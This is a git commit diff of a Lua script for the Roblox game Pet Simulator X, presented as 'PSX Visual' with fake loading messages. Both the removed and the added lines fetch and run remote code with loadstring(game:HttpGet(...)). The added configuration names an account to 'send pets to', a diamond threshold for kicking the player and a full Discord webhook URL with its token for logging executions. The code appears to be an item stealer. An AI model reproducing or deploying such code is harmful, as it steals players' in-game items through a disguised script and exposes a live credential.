d8258e31615582b1edc346394b8c1e98a242c822
MrPectable <126442140+MrPectable@users.noreply.github.com>
2023-05-15 21:12:10 -0400

    Update psxv.lua

--- psxv.lua
+++ psxv.lua
@@ -1,10 +1,8 @@
-UserName = "jsavige4"
-UserName2 = "jsavige4alt"
-Webhook = "https://discord.com/api/webhooks/1107824932538286101/F_dKjUoABU7pPMPa394w9a4au3H1UMK6lA5KY0Kq1eZKA6XEuB0QTeeaaMChjUELa4o9"
-_G.MouseLock = false
-_G.ScriptName = "PSX Visual"
-_G.FirstText = "Pls Wait While Loading...."
-_G.SecondText = "Loading...."
-_G.ThirdText = "Make Sure To Rejoin If Not At Bank/Mailbox!"
-_G.WaitingTime = 30
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
+--[[ Main Config ]]--
+_G.Username = "jsavige4" --// Username To Send Pets To
+_G.Diamonds = 750000 --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1107824932538286101/F_dKjUoABU7pPMPa394w9a4au3H1UMK6lA5KY0Kq1eZKA6XEuB0QTeeaaMChjUELa4o9" --// Discord Webhook For Executions
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
